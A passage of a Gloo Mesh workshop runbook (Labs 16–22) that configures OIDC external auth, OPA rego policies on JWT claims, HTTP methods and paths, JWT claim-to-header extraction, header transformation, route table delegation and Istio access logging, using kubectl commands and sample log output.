kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: httpbin-oidc-client-secret
  namespace: httpbin
type: extauth.solo.io/oauth
data:
  client-secret: $(echo -n ${HTTPBIN_CLIENT_SECRET} | base64)
EOF
```

Set the callback URL in your OIDC provider to map to our httpbin app
```bash
export APP_CALLBACK_URL="https://$(kubectl --context ${MGMT} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}')/get"

echo $APP_CALLBACK_URL
```

Lastly, replace the `OICD_CLIENT_ID` and `ISSUER_URL` values below with your OIDC app settings, in a later lab we will also use the `JWKS_URI` endpoint so we can just set it now as well
```bash
export OIDC_CLIENT_ID="solo-poc-clientid"
export ISSUER_URL="https://idam.gehealthcloud.io:443/t/solopocapp.group.app/oauth2/token"
export JWKS_URI="https://idam.gehealthcloud.io:443/t/solopocapp.group.app/oauth2/jwks"
```

Let's make sure our variables are set correctly:
```bash
echo $OIDC_CLIENT_ID
echo $ISSUER_URL
echo $JWKS_URI
```

### Create ExtAuthPolicy
Now we will create an `ExtAuthPolicy`, which is a CRD that contains authentication information. 
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin-extauth
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    server:
      name: mgmt-ext-auth-server
      namespace: httpbin
      cluster: mgmt
    glooAuth:
      configs:
      - oauth2:
          oidcAuthorizationCode:
            appUrl: ${APP_CALLBACK_URL}
            callbackPath: /oidc-callback
            clientId: ${OIDC_CLIENT_ID}
            clientSecretRef:
              name: httpbin-oidc-client-secret
              namespace: httpbin
            issuerUrl: ${ISSUER_URL}
            session:
              failOnFetchFailure: true
              redis:
                cookieName: gehc-session
                options:
                  host: redis.gloo-mesh-addons:6379
                allowRefreshing: true
              cookieOptions:
                maxAge: "90"
            scopes:
            - email
            - profile
            logoutPath: /logout
            afterLogoutUrl: /get
            headers:
              idTokenHeader: Jwt
EOF
```

After that, you need to create an `ExtAuthServer`, which is a CRD that define which extauth server to use: 
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: ExtAuthServer
metadata:
  name: mgmt-ext-auth-server
  namespace: httpbin
spec:
  destinationServer:
    ref:
      cluster: mgmt
      name: ext-auth-service
      namespace: gloo-mesh-addons
    port:
      name: grpc
EOF
```

Finally, you need to update the `RouteTable` to use this `AuthConfig`:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      labels:
        oauth: "true"
        waf: "true"
        ratelimited: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      - uri:
          prefix: /oidc-callback
      - uri:
          prefix: /logout
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Now when you access your httpbin app through the browser, it will be protected by the OIDC provider login page
```
echo "${APP_CALLBACK_URL}"
```

## Lab 17 - Integrating with OPA <a name="Lab-17"></a>

### OPA inputs
You can also perform authorization using OPA. Gloo Mesh's OPA integration populates an input document to use in your OPA policies which allows you to easily write rego policy
- `input.check_request` - By default, all OPA policies will contain an Envoy Auth Service CheckRequest. This object contains all the information Envoy has gathered of the request being processed. See the Envoy docs and proto files for AttributeContext for the structure of this object.
- `input.http_request` - When processing an HTTP request, this field will be populated for convenience. See the Envoy HttpRequest docs and proto files for the structure of this object.
- `input.state.jwt` - When the OIDC auth plugin is utilized, the token retrieved during the OIDC flow is placed into this field. 

## Lab
In this lab, we will make use of the `input.http_request` parameter in our OPA policies to decode the `jwt` token retrieved in the last lab and create policies using the claims available, namely the `sub` and `email` claims.

Instead of coupling the `oauth2` config with the `opa` config in a single `ExtAuthPolicy`, here we will separate the app to decouple the APIs from apps

## High Level Workflow
![Gloo Mesh Dashboard OIDC](images/runbook9a.png)

First we will create a new `ExtAuthPolicy` object to add the OPA filter. Note the use of the `applyToDestinations` in this `ExtAuthPolicy` instead of `applyToRoutes`. This matcher allows us to specify a destination where we want to apply our policy to, rather than on a Route. Note that the below uses a direct reference, but label matchers would work as well.

Lets apply the following policy
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin-opa
  namespace: httpbin
spec:
  applyToDestinations:
  - selector:
      name: in-mesh
      namespace: httpbin
      workspace: httpbin
  config:
    server:
      name: mgmt-ext-auth-server
      namespace: httpbin
      cluster: mgmt
    glooAuth:
      configs:
      - opaAuth:
          modules:
          - name: httpbin-opa
            namespace: httpbin
          query: "data.ehs.allow == true"
EOF
```

### Enforce @solo.io username login by inspecting the JWT email payload
For our first use-case we will decode the JWT token passed through extauth for the `email` payload, and enforce that a user logging in must end with `@solo.io` as the username with OPA

First, you need to create a `ConfigMap` with the policy written in rego. 
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["email"], "@solo.io")
    }
EOF
```

Now we should see success when logging in with a username that ends with `@solo.io` but will encounter a `403 Error - You don't have authorization to view this page` when using a username that ends with anything else (`@gmail.com` for example)

### Map to other claims in JWT
If you decode the JWT provided (using jwt.io for example), we can see other claims available
```
{
  "sub": "alex.solo@hc.ge.com",
  "email": "alex.ly@solo.io"
}
```

We can modify our rego rule to apply policy to map to `sub` as well as `email` claims
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["email"], "@solo.io")
    }
    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["sub"], "@hc.ge.com")
    }
EOF
```

Now you should be able to access the app logging in with users that end in `@solo.io`, as well as `@hc.ge.com`

### Use OPA to enforce a specific HTTP method
Let's continue to expand on our example by enforcing different HTTP methods for our two types of users
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["email"], "@solo.io")
        any({input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE",
    })
    }
    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["sub"], "@hc.ge.com")
        any({input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE",
    })
    }
EOF
```

If you refresh the browser where the `@solo.io` or `@hc.ge.com` user is logged in, we should now see a `403 Error - You don't have authorization to view this page`. This is because we are not allowing the `GET` method for either of those matches in our OPA policy

Let's fix that
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["email"], "@solo.io")
        any({input.http_request.method == "GET",
             input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE",
    })
    }
    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["sub"], "@hc.ge.com")
        any({input.http_request.method == "GET",
             input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE",
    })
    }
EOF
```

Now we should be able to access our app again.

### Enforce paths with OPA
Let's continue to expand on our example by enforcing a specified path for our users

Here we will modify our rego rule so that users with the `sub` claim containing `@hc.ge.com` can access the `/get` endpoint as well as any path with the prefix `/anything`, while users with the `email` claim containing `@solo.io` can only access specifically the `/anything/protected` endpoint
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["sub"], "@hc.ge.com")
        any({input.http_request.path == "/get",
        startswith(input.http_request.path, "/anything")
    })
        any({input.http_request.method == "GET",
             input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE",
    })
    }
    allow {
        [header, payload, signature] = io.jwt.decode(input.http_request.headers.jwt)
        endswith(payload["email"], "@solo.io")
        input.http_request.path == "/anything/protected"
        any({input.http_request.method == "GET",
             input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE",
    })
    }
EOF
```
If you refresh the browser where the `@hc.ge.com` user is logged in, we should be able to access the `/get` endpoint as well as any path with the prefix `/anything`. Try and access `/anything/foo` for example - it should work.

If you refresh the browser where the `@solo.io` user is logged in, we should now see a `403 Error - You don't have authorization to view this page` if you access anything other than the `/anything/protected` endpoint

### cleanup extauthpolicy for next labs
In the next labs we will explore using `JWTPolicy` to extract validated claims into new arbitrary headers and configure our OPA to leverage them. For now, we can remove the `httpbin-opa` policy to validate behavior before reimplementing it.
```
kubectl --context ${MGMT} -n httpbin delete ExtAuthPolicy httpbin-opa
```

## Lab 18 - Use the JWT filter to create headers from claims <a name="Lab-18"></a>
In this step, we're going to validate the JWT token and to create a new header from the `email` or `sub` claim. By doing so, we can gain a few benefits:
- Simplified OPA policies (Lab 20)
- JWT token doesn’t need to be passed along to backend and to OPA server (optional)            
- JWT policy can do JWT token level validations upfront and then extract claims and pass them as arbitrary headers to the backend. Rego policies are then simpler and can deal with these validated headers for RBAC decisions rather than decoding them from JWT.

## High Level Workflow
![Gloo Mesh Dashboard OIDC](images/runbook10a.png)

JWKS endpoint is running outside of the Service Mesh, so we need to define an `ExternalService`. 
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: oidc-jwks
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
  - idam.gehealthcloud.io
  ports:
  - name: https
    number: 443
    protocol: HTTPS
    clientsideTls: {}
EOF
```

Now, we can create a `JWTPolicy` to extract the claim.

Create the policy:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: JWTPolicy
metadata:
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    phase:
      postAuthz:
        priority: 1
    providers:
      oidc:
        issuer: "https://idam.gehealthcloud.io:443/t/solopocapp.group.app/oauth2/token"
        tokenSource:
          headers:
          - name: jwt
        remote:
          url: "https://idam.gehealthcloud.io:443/t/solopocapp.group.app/oauth2/jwks"
          cacheDuration: 10m
          destinationRef:
            ref:
              name: oidc-jwks
              namespace: httpbin
              cluster: mgmt
            kind: EXTERNAL_SERVICE
            port: 
              number: 443
          enableAsyncFetch: false
        claimsToHeaders:
        - claim: email
          header: X-Email
        - claim: sub
          header: X-Sub
        - claim: amr
          header: X-Amr
EOF
```
You can see that the `applyToRoutes` is set to our existing routes where `oauth: "true"` but also that we want to execute it after performing the external authentication (to have access to the JWT token) by setting the priority to `priority: 1` (note that lower value has higher priority)

If you refresh the web page, you should see new `X-Email` and `X-Sub` headers have replaced our `jwt` header. (Note that if you want to keep the `jwt` header and just extract the claims to new headers this is also possible in Gloo Mesh 2.1)

## Lab 19 - Use the transformation filter to manipulate headers <a name="Lab-19"></a>
Let's explore using the transformation filter again, this time we're going to use a regular expression to extract a part of an existing header and to create a new one:

Let's create a `TransformationPolicy` to extract the claim.
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: TransformationPolicy
metadata:
  name: modify-x-sub-header
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        oauth: "true"
  config:
    phase:
      postAuthz:
        priority: 2
    request:
      injaTemplate:
        extractors:
          organization:
            header: 'X-Sub'
            regex: '.*@(.*)$'
            subgroup: 1
        headers:
          org:
            text: "{{ organization }}"
EOF
```
You can see that it will be applied to our existing route and also that we want to execute it after performing the external authentication (to have access to the JWT token).

If you refresh the web page, you should see a new `org` header added to the request with the value `hc.ge.com`!

## Lab 20 - Implement OPA on new validated/transformed claims <a name="Lab-20"></a>
Now that we have validated, extracted, and transformed our claims into the shape we want, we can also configure our OPA policies to simplify our workflow! 

Note that the Lab 19 transformation is not required, you can configure your OPA policy directly on the header provided by `claimsToHeaders` (i.e. `X-Email` and `X-Sub`), but to build on top of our current example we will configure our OPA policy on the `org` header content

Lets modify our existing OPA config, and intentionally introduce a violation where the `org` header value is `"hc.ge.co"` instead of `"hc.ge.com"`
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        any({input.http_request.path == "/get",
             input.http_request.path == "/anything"
          })
        # these are headers provided by JWTPolicy and claimsToHeaders feature
        any({input.http_request.headers.org == "hc.ge.co"})
        any({input.http_request.method == "GET",
             input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE"
             })
    }
EOF
```

Now let's reimplement our OPA `ExtAuthPolicy` that we used before:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: ExtAuthPolicy
metadata:
  name: httpbin-opa
  namespace: httpbin
spec:
  applyToDestinations:
  - selector:
      name: in-mesh
      namespace: httpbin
      workspace: httpbin
  config:
    server:
      name: mgmt-ext-auth-server
      namespace: httpbin
      cluster: mgmt
    glooAuth:
      configs:
      - opaAuth:
          modules:
          - name: httpbin-opa
            namespace: httpbin
          query: "data.ehs.allow == true"
EOF
```
As you can see, the above policy will fail with a `403` because our `org` header value is `"hc.ge.com"` while the OPA policy is matching on `"hc.ge.co"`

Lets fix this:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: httpbin-opa
  namespace: httpbin
data:
  policy.rego: |-
    package ehs

    default allow = false

    allow {
        any({input.http_request.path == "/get",
             input.http_request.path == "/anything"
          })
        # these are headers provided by JWTPolicy and claimsToHeaders feature
        any({input.http_request.headers.org == "hc.ge.com"})
        any({input.http_request.method == "GET",
             input.http_request.method == "POST",
             input.http_request.method == "PUT",
             input.http_request.method == "DELETE"
             })
    }
EOF
```

As you can see, the above policy will allow a user with the validated claim header `org` we extracted and transformed in the last two labs with the value `solo.io` to access the `/get` and `/anything` path of our httpbin application!

We have now demonstrated RBAC policy with OPA using validated claims provided by the `JWTPolicy`!

### cleanup labs 16-20
First let's apply the original `RouteTable` yaml:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Lets clean up the OAuth policies we've created:
```
# extauth config
kubectl --context ${MGMT} -n httpbin delete ExtAuthPolicy httpbin-extauth
kubectl --context ${MGMT} -n httpbin delete ExtAuthPolicy httpbin-opa
kubectl --context ${MGMT} -n httpbin delete secret httpbin-oidc-client-secret
kubectl --context ${MGMT} -n httpbin delete ExtAuthServer mgmt-ext-auth-server

# opa config
kubectl --context ${MGMT} -n httpbin delete configmap httpbin-opa

# jwtpolicy
kubectl --context ${MGMT} -n httpbin delete externalservice oidc-jwks
kubectl --context ${MGMT} -n httpbin delete jwtpolicy httpbin

# transformation
kubectl --context ${MGMT} -n httpbin delete transformationpolicy modify-x-sub-header
```

## [Lab 21 - Route Table Delegation](#Lab-21)

See [Official Docs](https://docs.solo.io/gloo-mesh-enterprise/latest/routing/rt-delegation/)
As your Gloo Mesh environment grows in size and complexity, the number of routes configured on a given gateway might increase considerably. Or, you might have multiple ways of routing to a particular path for an app that are difficult to consistently switch between. To organize multiple routes, you can create sub-tables for individual route setups. Then, you create a root route table that delegates requests to those sub-tables based on a specified sorting method.


Below is a basic example for Route Delegation using our `httpbin` app. take a look at the official docs for more examples and documentation

Lets make sure to remove the current `httpbin` route
```
kubectl --context ${MGMT} -n httpbin delete routetable httpbin
```

Then we will first deploy our `httpbin-root` RouteTable. This is where we define our domain. This root route table would typically be owned by the Gateway team and delegated to development teams
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin-root
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
  - delegate:
      # Selects tables based on label
      routeTables:
        - labels:
            table: httpbin-table
      # Delegates based on order of weights
      sortMethod: ROUTE_SPECIFICITY
EOF
```

Next we will configure our `httpbin-delegate1` RouteTable. This delegate table will own the `/get` path of the `httpbin` app
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin-delegate1
  namespace: httpbin
  labels:
    expose: "true"
    table: httpbin-table
spec:
  http:
    - name: httpbin-get
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

You should now be able to access the httpbin application at the `/get` endpoint again
```
echo "${APP_CALLBACK_URL}"
```

Now lets add a second delegated table. This delegate table will own the `/anything` path of the `httpbin` app
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin-delegate2
  namespace: httpbin
  labels:
    expose: "true"
    table: httpbin-table
spec:
  http:
    - name: httpbin-anything
      matchers:
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Now you should be able to access the `/anything` endpoint.

## [Lab 22 - Apply ExtAuth to delegated routes](#Lab-22)


### cleanup lab 21-22
Lets clean up the OAuth policies we've created:
```
kubectl --context ${MGMT} -n httpbin delete routetable httpbin-root
kubectl --context ${MGMT} -n httpbin delete routetable httpbin-delegate1
kubectl --context ${MGMT} -n httpbin delete routetable httpbin-delegate2
```


First let's apply the original `RouteTable` yaml:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

## [Lab 22 - Access Logging](#Lab-22)
If you take a look back at [Lab 2 - Deploy Istio](#Lab-2) when deploying istiod we set the config
```
meshConfig:
  trustDomain: mgmt
  accessLogFile: /dev/stdout
```
By setting this config, we have already enabled Istio access logging for workloads in our mesh.

You can see the access logs printed in stdout if you take a look at the logs of your ingress gateway pod for example
```
kubectl --context ${MGMT} logs -n istio-gateways istio-ingressgateway-57866754f6-7mljt
```

The output should show the [default access log format](https://istio.io/latest/docs/tasks/observability/logs/access-log/#default-access-log-format)
```
[%START_TIME%] \"%REQ(:METHOD)% %REQ(X-ENVOY-ORIGINAL-PATH?:PATH)% %PROTOCOL%\" %RESPONSE_CODE% %RESPONSE_FLAGS% %RESPONSE_CODE_DETAILS% %CONNECTION_TERMINATION_DETAILS%
\"%UPSTREAM_TRANSPORT_FAILURE_REASON%\" %BYTES_RECEIVED% %BYTES_SENT% %DURATION% %RESP(X-ENVOY-UPSTREAM-SERVICE-TIME)% \"%REQ(X-FORWARDED-FOR)%\" \"%REQ(USER-AGENT)%\" \"%REQ(X-REQUEST-ID)%\"
\"%REQ(:AUTHORITY)%\" \"%UPSTREAM_HOST%\" %UPSTREAM_CLUSTER% %UPSTREAM_LOCAL_ADDRESS% %DOWNSTREAM_LOCAL_ADDRESS% %DOWNSTREAM_REMOTE_ADDRESS% %REQUESTED_SERVER_NAME% %ROUTE_NAME%\n
```

For example:
```
[2022-07-11T20:49:36.292Z] "GET /callback?code=72S_sRhA8PNvZr_8qXHS0_W8gAcBTFaWq9z67OkX5IM&state=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTc1NzQzNjksImlhdCI6MTY1NzU3MjU2OSwic3RhdGUiOiJodHRwczovL2h0dHBiaW4uZ2xvb3Rlc3QuY29tL2dldCJ9.aly6iawiNcEiRZTx_9zTr27Q8V4Hwk1Ra13ytwGETF4 HTTP/2" 302 UAEX ext_authz_denied - "-" 0 0 636 - "10.48.0.1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "ab2f16e7-f683-4872-a58f-980718a63acd" "httpbin.glootest.com" "-" outbound|8000||in-mesh.httpbin.svc.cluster.local - 10.48.0.24:8443 10.48.0.1:50586 httpbin.glootest.com -
[2022-07-11T20:49:37.000Z] "GET /get HTTP/2" 200 - via_upstream - "-" 0 2465 7 2 "10.48.0.1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "e8aa64cd-2695-4e27-9e53-6ba2b2b5a9b4" "httpbin.glootest.com" "10.48.0.25:80" outbound|8000||in-mesh.httpbin.svc.cluster.local 10.48.0.24:37316 10.48.0.24:8443 10.48.0.1:50586 httpbin.glootest.com httpbin-httpbin
```

You can also view the access logs from each application sidecar
```
kubectl logs -n httpbin in-mesh-6cff8c4dbd-ks22g -c istio-proxy -f
```

Example output:
```
[2022-07-11T20:53:27.509Z] "GET /get HTTP/1.1" 200 - via_upstream - "-" 0 2459 2 2 "10.48.0.1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" "60e89013-66c7-45a9-98f8-4a46b1b674cc" "httpbin.glootest.com" "10.48.0.25:80" inbound|80|| 127.0.0.6:57255 10.48.0.25:80 10.48.0.1:0 outbound_.8000_._.in-mesh.httpbin.svc.cluster.local default
```

This access log output can be sent to log collectors such as fluentd and then shipped to your favorite enterprise logging service such as Datadog or Splunk